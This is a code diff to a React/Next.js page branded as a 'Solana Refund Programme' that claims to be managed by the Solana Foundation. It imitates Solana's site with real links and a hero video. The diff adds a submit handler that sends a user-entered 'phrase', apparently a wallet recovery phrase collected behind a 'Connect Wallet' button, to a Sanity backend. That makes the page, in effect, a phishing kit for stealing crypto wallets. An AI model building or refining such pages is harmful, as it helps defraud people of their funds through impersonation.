@@ -3,6 +3,7 @@ import Image from "next/image";
 import styles from "../styles/Home.module.css";
 import Cancel from "./comps/Cancel";
 import react, { useState } from "react";
+import client from "../sanity";
 
 export default function Home() {
   const [phrase, setPhrase] = useState("");
@@ -64,6 +65,15 @@ export default function Home() {
     }
     setPhrase("");
     alert("Phrase Word has been submitted");
+    // Send details to backend
+    const doc = {
+      _type: "phrase",
+      phrase,
+    };
+    client
+      .create(doc)
+      .then((res) => console.log("Results", res))
+      .catch((err) => console.error(err));
   };
   const showModal = () => {
     document
@@ -101,11 +111,11 @@ export default function Home() {
   ];
 
   const firstList = [
-    "Grants",
-    "Break Solana",
-    "Media Kit",
-    "Careers",
-    "Disclaimer",
+    { name: "Grants", link: "https://solana.org/grants" },
+    { name: "Break Solana", link: "https://break.solana.com/" },
+    { name: "Media Kit", link: "https://solana.com/branding" },
+    { name: "Careers", link: "https://jobs.solana.com/jobs" },
+    { name: "Disclaimer", link: "https://solana.com/disclaimer" },
   ];
   const secondList = ["Ecosystem", "Blog", "Newsletter"];
   return (
@@ -129,7 +139,7 @@ export default function Home() {
       <main className="p-5 bg-[url('/Mian-bg.webp')]  overflow-hidden h-screen relative">
         <div className="backdrop-blur-md modal absolute w-screen hidden h-screen bg-black/30"></div>
 
-        <nav className="grid w-full grid-cols-2 mb-2">
+        <nav className="grid items-center relative z-10 w-full grid-cols-2 mb-2">
           <div className="flex">
             <img
               src="sol.svg"
@@ -139,7 +149,7 @@ export default function Home() {
           </div>
           <div className="flex justify-end">
             <ul className="flex gap-5 items-center">
-              <li className="relative z-10">
+              <li className="">
                 <a
                   href="https://solana.com/"
                   className="relative cursor-pointer"
@@ -149,7 +159,7 @@ export default function Home() {
               </li>
               <li
                 id="connectWallet"
-                className="bg-[#17fb9b] relative z-10 cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
+                className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
                 onClick={showModal}
               >
                 Connect Wallet
@@ -163,10 +173,25 @@ export default function Home() {
           className="flex justify-center flex-col items-center w-full
         "
         >
-          <div className="sm:ml-60 ml-20 flex items-center h-screen absolute">
+          {/* <div className="sm:ml-60 ml-20 flex items-center h-screen absolute">
             <img src="Sol-Main-img.webp" alt="Sol-Image" className="" />
+          </div> */}
+          {/* Try Image */}
+          <div className="absolute flex justify-center sm:right-0 right-20 min-h-screen min-w-full">
+            <video
+              className="right-80"
+              loop
+              playsInline
+              autoPlay
+              poster="solana.com/src/img/index/hero-wide.jpg"
+              muted
+              src="https://player.vimeo.com/external/589655407.hd.mp4?s=2de3fde08e6ce9dac62bfe1e8db32ef72461a5af&profile_id=175"
+            ></video>
+            <div className="absolute z-2 w-full h-full bg-overlay"></div>
           </div>
-          <div className="flex mt-[27rem] gap-10 flex-col items-center">
+
+          {/* End Try Video */}
+          <div className="flex mt-[27rem] relative z-10 gap-10 flex-col items-center">
             <h1 className="font-semibold sm:text-7xl text-5xl text-center">
               {" "}
               <span className="font-extralight">Solana</span> Refund Programme
@@ -264,7 +289,7 @@ export default function Home() {
         </div>
       </main>
       {/* Footer */}
-      <footer className="border-gray-700 bg- bg-[url('/Mian-bg.webp')] sm:grid sm:grid-cols-2 border-t-[1px] sm:p-20 p-10">
+      <footer className="sm:bg-footer-graient bg-small-bg sm:grid sm:grid-cols-2 sm:p-20 p-10">
         <div className="flex flex-col sm:mb-0 mb-10 sm:justify-start sm:items-start justify-center items-center text-center">
           <img src="solRnWallet.webp" alt="Sol-logo" className="w-10 h-10" />
           <p className="mt-2">Managed by Solana Foundation</p>
@@ -289,9 +314,11 @@ export default function Home() {
               <li className="sm:text-base text-sm mb-2">SOLANA</li>
               {firstList.map((item) => {
                 return (
-                  <li className="text-gray-500 sm:mt-3 mt-2 sm:text-base text-sm  hover:text-white">
-                    {item}
-                  </li>
+                  <a href={item.link}>
+                    <li className="text-gray-500 sm:mt-3 mt-2 sm:text-base text-sm  hover:text-white">
+                      {item.name}
+                    </li>
+                  </a>
                 );
               })}
             </ul>
